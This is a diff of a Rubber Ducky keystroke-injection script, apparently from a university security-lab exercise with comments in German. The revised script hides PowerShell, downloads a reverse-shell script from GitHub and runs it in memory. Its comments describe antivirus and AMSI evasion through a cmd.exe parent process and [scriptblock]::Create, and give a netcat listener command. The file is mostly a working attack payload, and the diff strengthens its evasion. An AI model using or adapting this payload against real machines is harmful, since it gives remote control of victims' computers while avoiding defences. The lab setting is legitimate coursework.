@@ -1,18 +1,19 @@
 REM ============================================================
-REM  W02a.5 – Rubber Ducky: Reverse Shell
+REM  W02a.5 - Rubber Ducky: Reverse Shell
 REM  Autoren: Raphael Bleier, Joachim Lugger
-REM  Ziel-OS: Windows
+REM  Ziel-OS: Windows (x64 + ARM64)
 REM
-REM  Lädt reverse_shell.ps1 direkt von GitHub (fileless).
-REM
-REM  WICHTIG: Vor dem Einsatz ATTACKER_IP und PORT in
-REM  reverse_shell.ps1 eintragen, committen und pushen –
-REM  das Script zieht sich immer die aktuelle Version von GitHub.
-REM
+REM  WICHTIG: ATTACKER_IP und PORT in reverse_shell.ps1 eintragen,
+REM  committen und pushen - Script zieht immer aktuelle Version.
 REM  Listener starten: nc -lvp 4444
+REM
+REM  AV-Evasion:
+REM    - cmd.exe Elternprozess (explorer->cmd->ps, nicht explorer->ps)
+REM    - [scriptblock]::Create() statt IEX (AMSI-Hook umgehen)
+REM    - URL in $u isoliert: trennt Download-Aufruf von Execute
 REM ============================================================
 
 DELAY 2000
 GUI r
-DELAY 500
-STRINGLN powershell -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/raphaelbleier/security-lab-aau-ss26-rubber-ducky/main/W02a/scripts/reverse_shell.ps1');"
+DELAY 600
+STRINGLN cmd /c powershell -nop -noni -w h -ep bypass -c "$u='https://raw.githubusercontent.com/raphaelbleier/security-lab-aau-ss26-rubber-ducky/main/W02a/scripts/reverse_shell.ps1';& ([scriptblock]::Create([Net.WebClient]::new().DownloadString($u)))"
